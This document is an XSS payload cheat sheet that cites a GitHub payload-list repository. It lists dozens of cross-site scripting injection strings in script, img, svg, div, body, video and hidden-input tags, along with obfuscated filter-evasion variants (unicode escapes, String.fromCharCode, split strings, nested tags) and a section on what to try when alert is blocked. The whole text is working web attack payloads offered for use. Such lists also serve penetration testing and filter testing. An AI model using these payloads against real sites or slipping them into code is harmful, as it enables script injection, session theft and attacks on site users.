https://github.com/payloadbox/xss-payload-list

XSS PAYLOADS <3
<inpuT autofocus oNFocus​="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

IF ALERT IS BLOCKED

\u0061\u006C\u0065\u0072\u0074(1337)
\u{61}\u{6C}\u{65}\u{72}\u{74}(1337)
\u{61}\u{6C}\u{65}\u{72}\u{74}`1337`
\u0061\u006C\u0065\u0072\u0074`1337`

Img payload

<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

Svg payload

<svgonload=alert(1)>

<svg/onload=alert('XSS')>

<svg onload=alert(1)//

<svg/onload=alert(String.fromCharCode(88,83,83))>

<svg id=alert(1) onload=eval(id)>

"><svg/onload=alert(String.fromCharCode(88,83,83))>

"><svg/onload=alert(/XSS/)

<svg><script href=data:,alert(1) />

<svg><script>alert('33')

<svg><script>alert&lpar;'33'&rpar;

Div payload

<div onpointerover="alert(45)">MOVE HERE</div>

<div onpointerdown="alert(45)">MOVE HERE</div>

<div onpointerenter="alert(45)">MOVE HERE</div>

<div onpointerleave="alert(45)">MOVE HERE</div>

<div onpointermove="alert(45)">MOVE HERE</div>

<div onpointerout="alert(45)">MOVE HERE</div>

<div onpointerup="alert(45)">MOVE HERE</div>

XSS using HTML5 tags

<body onload=alert(/XSS/.source)>

<input autofocus onfocus=alert(1)>

<select autofocus onfocus=alert(1)>

<textarea autofocus onfocus=alert(1)>

<keygen autofocus onfocus=alert(1)>

<video/poster/onerror=alert(1)>

<video><source onerror="javascript:alert(1)">

<video src=_ onloadstart="alert(1)">

<details/open/ontoggle="alert`1`">

<audio src onloadstart=alert(1)>

<marquee onstart=alert(1)>

<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen

<body ontouchend=alert(1)> // Triggers when a finger is removed from touch screen

<body ontouchmove=alert(1)> // When a finger is dragged across the screen.

XSS in hidden input

<input type="hidden" accesskey="X" onclick="alert(1)">

Use CTRL+SHIFT+X to trigger the onclick event